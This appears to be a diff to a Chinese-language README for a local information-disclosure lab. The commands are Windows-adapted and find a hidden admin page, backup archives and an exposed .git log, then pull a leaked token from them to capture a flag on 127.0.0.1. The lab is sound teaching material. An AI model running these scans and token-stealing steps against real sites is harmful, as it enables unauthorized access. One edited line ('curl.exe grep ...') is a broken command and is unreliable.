@@ -17,6 +17,10 @@
 
 ## 一、启动环境
 
+> ⚠️ **Windows PowerShell 5.1 用户注意**：`curl` 在那里是 `Invoke-WebRequest` 的别名，
+> 敲 `curl -H "A: B"` 会报「无法绑定参数 Headers」。请改用 **`curl.exe`**（Windows 10 1803+ 自带）。
+> 完整命令对照表见总 README 的「**在 Windows 上怎么敲这些命令**」一节。
+
 ```bash
 cd infoleak-demo
 docker compose up -d --build
@@ -241,7 +245,7 @@ cd dump && git log --oneline && git show HEAD
 ### 10. 目录扫描
 
 ```bash
-dirsearch -u http://127.0.0.1:8090 -e php,bak,zip,txt,old
+python dirsearch.py -u http://127.0.0.1:8090 -e php,bak,zip,txt,old
 # 或
 feroxbuster -u http://127.0.0.1:8090 -w /usr/share/wordlists/dirb/common.txt
 ```
@@ -267,27 +271,27 @@ feroxbuster -u http://127.0.0.1:8090 -w /usr/share/wordlists/dirb/common.txt
 ### 通路 A：robots → 后台 → 备份里的口令
 
 ```bash
-curl -s http://127.0.0.1:8090/robots.txt | grep admin            # 发现后台
-curl -s http://127.0.0.1:8090/admin_9k2x/ | grep -o '口令没有写在页面上.*'
-curl -s http://127.0.0.1:8090/stats.php.bak | grep DEBUG_TOKEN   # 偷口令
-curl -s "http://127.0.0.1:8090/admin_9k2x/?token=sk-9f2c1a7b" | grep -o 'flag{[^}]*}'
+curl.exe -s http://127.0.0.1:8090/robots.txt | grep admin            # 发现后台
+curl.exe -s http://127.0.0.1:8090/admin_9k2x/ | grep -o '口令没有写在页面上.*'
+curl.exe -s http://127.0.0.1:8090/stats.php.bak | grep DEBUG_TOKEN   # 偷口令
+curl.exe -s "http://127.0.0.1:8090/admin_9k2x/?token=sk-9f2c1a7b" | grep -o 'flag{[^}]*}'
 ```
 
 ### 通路 B：HTML 注释 → 打包备份 → 调试入口
 
 ```bash
-curl -s http://127.0.0.1:8090/ | grep -o '/backup/www.zip'
-curl -sO http://127.0.0.1:8090/backup/www.zip && unzip -o www.zip -d wwwz
-grep DEBUG_TOKEN wwwz/config/config.php
-curl -s "http://127.0.0.1:8090/secret_debug.php?token=sk-9f2c1a7b" | grep -o 'flag{[^}]*}'
+curl.exe -s http://127.0.0.1:8090/ | grep -o '/backup/www.zip'
+curl.exe -sO http://127.0.0.1:8090/backup/www.zip && unzip -o www.zip -d wwwz
+curl.exe grep DEBUG_TOKEN wwwz/config/config.php
+curl.exe -s "http://127.0.0.1:8090/secret_debug.php?token=sk-9f2c1a7b" | grep -o 'flag{[^}]*}'
 ```
 
 ### 通路 C：`.git` 泄露
 
 ```bash
-curl -s http://127.0.0.1:8090/.git/logs/HEAD                     # 日志里读到「口令在 stats.php.bak」
-curl -s http://127.0.0.1:8090/stats.php.bak | grep DEBUG_TOKEN
-curl -s "http://127.0.0.1:8090/secret_debug.php?token=sk-9f2c1a7b" | grep -o 'flag{[^}]*}'
+curl.exe -s http://127.0.0.1:8090/.git/logs/HEAD                     # 日志里读到「口令在 stats.php.bak」
+curl.exe -s http://127.0.0.1:8090/stats.php.bak | grep DEBUG_TOKEN
+curl.exe -s "http://127.0.0.1:8090/secret_debug.php?token=sk-9f2c1a7b" | grep -o 'flag{[^}]*}'
 ```
 
 > 三条通路用的是同一个口令，都指向 `secret_debug.php` 或 `admin_9k2x`。
